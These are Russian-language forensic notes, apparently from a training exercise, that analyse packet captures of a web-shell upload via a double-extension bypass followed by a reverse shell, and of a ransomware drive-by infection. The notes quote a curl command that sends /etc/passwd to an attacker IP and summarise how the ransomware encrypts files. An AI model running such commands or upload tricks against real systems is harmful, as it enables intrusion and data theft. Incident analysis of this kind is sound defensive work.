## Расследование

Проанализируем трафик. Злоумышленник инициировал соединение с веб сервером.  в 53 пакете на сервер был отправлен POST запрос с вредоносным кодом по адресу reviews/ uploads.![](attachment/Pasted%20image%2020261105180250.png)
image.jpg.php - это уязвимость с небезопасной загрузкой файлов и обходом защиты двойным расширением. Клиент запрашивает страницу с адресом reviews/ uploads/image.jpg.php. Тем самым запустив скрипт.![](attachment/Pasted%20image%2020261105175801.png)
 После пакета 138 сервис сам инициировал соединение, что указывает на reverse shell, а так же приглашение /bin/shell в TCP Stream.  

![](attachment/Pasted%20image%2020261105180752.png)
Злоумышленник открывает файл passwd. Данный файл содержит логины и пароли пользователей. Однако хэши паролей хранятся отдельно, так что получение конфиденциальной информации не подтверждено. 

Далее:

curl -X POST -d /etc/passwd http://117.11.88.124:443/ - была введена следующая команда. Злоумышленник отправил на свой хост запрос POST с текстом /etc/passwd.

## Расследование:

Захват начинается с  регистрация имени `DAN-COMPUTER` и проверки доступа к интернету с помощью `www.msftncsi.com/ncsi.txt`. 

![](attachment/Pasted%20image%2020261108135734.png)
пользователь последовательно устанавливает соединения с серверами и отправляет GET запросы.
`expert5.ru` - `404 Not Found`
`www.shiashop.com` - `200 OK`
`infosoft.pl` - `404 Not Found`
`lamancha.club` - Перенаправление, затем JavaScript
В пакете 97 начинаете передача вредоносного кода. Причем код обфусцирован - намеренно сделан нечитаемым для человека, но работосопобным.
![](attachment/Pasted%20image%2020261108170426.png)

Скрипт содержит список серверов, перебирает их, сохраняет компоненты во временный каталог и предусматривает запуск PHP кода через скачанный исполняемый файл.
Ключевые ответы приходят от connexion-zen.com, IP `213.186.33.87`
Код предусматривает:

1. Обход доступных дисков от `C:` до `Z:`.
2. Поиск документов, фотографий, архивов, баз данных и множества других типов файлов.
3. Чтение первых **100 000 байт** каждого выбранного файла.
4. Перезапись этого участка нулями.
5. Шифрование сохранённого исходного участка с помощью AES и защиту ключевого материала через RSA.
6. Сохранение зашифрованных данных в отдельный файл `.db`.
7. Создание окна `.hta` с требованием выкупа и его открытие через `mshta.exe`

В пакетах **12046–12047** начинаются соединения к `103.198.0.2:443`. Компьютер обратился к адресу из инструкции по выкупу.
